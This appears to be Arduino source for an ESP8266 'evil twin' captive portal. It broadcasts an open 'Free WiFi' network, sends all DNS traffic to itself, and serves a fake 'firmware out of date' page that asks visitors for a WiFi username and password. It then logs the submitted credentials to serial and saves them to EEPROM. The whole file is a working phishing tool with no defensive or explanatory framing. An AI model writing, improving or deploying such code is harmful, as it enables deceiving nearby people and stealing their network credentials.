#include <EEPROM.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// simple variable
int initial_state = 0;

// eeprom
String esid = "";
String epass = "";
int eeprom_size = 512;

// captive portal
const char* SSID_NAME = "Free WiFi";
const byte DNS_PORT = 53;
const byte HTTP_CODE = 200;
IPAddress APIP(172, 0, 0, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;"); a.replace(">", "&gt;");
  a.substring(0, 200); return a;
}

String index() {
  String a = "hello world";
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + "TITLE" + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + "Setting" + "</b> " + "information." + "</nav><div><h1>" + "CREDENTIAL" + "</h1></div><div>";
  return h + "<div>" + "Your device firmware is out of date. Update your firmware to continue browsing normally." + "</ol></div><div><form action=/post method=post><label>WiFi username:</label><input type=text name=p><label>WiFi password:</label>" +
         "<input type=password name=m></input><input type=submit value=Start></form>" + "</div><div class=q><a>&#169; All rights reserved.</a></div>" ;
}

String updated() {
  String ssid = input("p");
  String pass = input("m");
  Serial.println(ssid);
  Serial.println(pass);
  Serial.println("Writing to EEPROM");
  for ( int i = 0; i < eeprom_size ; ++i ) EEPROM.write(i, 0x00);
  for ( int i = 0; i < ssid.length() ; ++i ) EEPROM.write(i, ssid[i]);
  for ( int i = 0; i < pass.length() ; ++i ) EEPROM.write(32 + i, pass[i]);
  EEPROM.commit();
  delay(100);
  Serial.println("Wrote to EEPROM");
  return index();
}

void setup() {
  Serial.begin(115200);
  delay(100);
  EEPROM.begin(eeprom_size);
  delay(10);

  Serial.println("Startup");
  Serial.println("Reading EEPROM ssid");
  for ( int i = 0; i < 32; ++i) esid += char(EEPROM.read(i));
  Serial.print("SSID: ");
  delay(10);
  Serial.println(esid.c_str());
  Serial.println("Reading EEPROM pass");
  for ( int i = 32; i < 96; ++i) epass += char(EEPROM.read(i));
  Serial.print("PASS: ");
  Serial.println(epass.c_str());

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", updated());
  });
  webServer.onNotFound([]() {
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
